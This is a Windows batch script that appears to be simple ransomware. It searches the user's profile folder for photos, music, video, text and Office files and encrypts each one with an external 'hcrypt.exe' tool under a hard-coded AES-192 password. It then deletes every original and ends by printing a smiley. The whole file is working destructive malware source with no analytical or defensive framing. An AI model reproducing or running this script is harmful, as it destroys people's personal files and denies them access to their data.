@echo off
mode con cols=150 lines=30
if not exist hcrypt.exe echo error & timeout 2 /nobreak >nul & exit
set encrypt_path=%userprofile%
echo Loading...
set cdnow=%cd%
set debug=on
cd %encrypt_path%
set b=0
set pass=1v5m0b3js7dbnsunwsuw@fcvTaFrrs
if exist "%cdnow%\files.txt" del "%cdnow%\files.txt"
set file_name=jpg
call :search_files
set file_name=mp3
call :search_files
set file_name=mp4
call :search_files
set file_name=gif
call :search_files
set file_name=txt
call :search_files
set file_name=png
call :search_files
set file_name=pptx
call :search_files
set file_name=doc
call :search_files
set /a b=%b%+1
echo files:%b%>>"%cdnow%/files.txt"
for /f "tokens=1* delims=:" %%i in ('findstr /b "files:" "%cdnow%\files.txt"') do set "files=%%j"
:encrypt
set c=0
cd "%cdnow%"
:encrypt_loop
set /a c=%c%+1
for /f "tokens=1* delims=:" %%i in ('findstr /b "%c%:" "%cdnow%\files.txt"') do set "file_now=%%j"
echo %c%/%files% %file_now%
hcrypt.exe --encrypt --file=%file_now% --pass=%pass% --algo=AES-192
if %c%==%files% goto delete_all
goto encrypt_loop
:delete_all
set c=0
:delete_all_loop
set /a c=%c%+1
for /f "tokens=1* delims=:" %%i in ('findstr /b "%c%:" "%cdnow%\files.txt"') do set "file_now=%%j"
echo [DEL] %c%/%files% %file_now%
del %file_now%
if %c%==%files% goto finnish
goto delete_all_loop
:finnish
cls
echo :)
timeout 5 /nobreak >nul
exit
:search_files
for /f "delims=" %%a IN ('dir /b /s *.%file_name%') do set a="%%a" & call :search_files1 %%a
goto end
:search_files1
set /a b=%b%+1
if %debug%==on echo %b% - %a%
echo %b%:%a%>>"%cdnow%/files.txt"
cls
echo %b%:%a%
goto :eof
:end